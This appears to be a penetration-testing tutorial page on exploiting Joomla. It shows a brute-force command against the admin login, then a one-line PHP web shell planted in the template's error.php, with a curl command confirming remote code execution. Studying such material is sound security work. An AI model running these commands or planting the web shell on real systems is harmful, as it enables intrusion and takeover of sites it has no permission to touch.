---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# Joomla Exploitation

If we can gain access, we may be able to land in the client's internal environment and begin enumerating the internal domain environment. Like WordPress and Drupal, Joomla has had its fair share of vulnerabilities against the core application and vulnerable extensions.

Furthermore, like the others, it is possible to gain remote code execution if we can log in to the admin backend.

## Brute Forcing

### joomla-bruteforce

The default administrator account on Joomla installs is `admin`, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing.

We can use the [joomla-bruteforce.md](../../../../toolbox/tooling/password-attacks/joomla-bruteforce.md "mention")script to attempt to brute force the login.

{% code title="Command" %}
```bash
sudo python3 joomla-brute.py -u http://dev.acme.com -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
{% endcode %}

{% code title="Output" %}
```bash
admin:admin
```
{% endcode %}

## Abusing Built-in Functionality

### Code Execution

Once credentials are obtained log in to the target backend at `http://<URL>/administrator`. Once logged in, we can add a snippet of PHP code to gain RCE. We can do this by customising a template.

{% hint style="danger" %}
## An error has occurred. Call to a member function format() on null

If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://\<URL>/administrator/index.php?option=com\_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.

<figure><img src="../../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Next, we can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.

<figure><img src="../../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Finally, we can click on a page to pull up the page source.

{% hint style="info" %}
## Web Shell Best Practice

It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.
{% endhint %}

Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution as follows.

{% code title="PHP Web Shell" %}
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Once this is in, click on `Save & Close` at the top and confirm code execution using `cURL`.

```bash
curl -s http://dev.acme.com/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

From here, we can upgrade to an interactive reverse shell and begin looking for local privilege escalation vectors or focus on lateral movement within the corporate network. We should be sure, once again, to note down this change for our report appendices and make every effort to remove the PHP snippet from the `error.php` page.
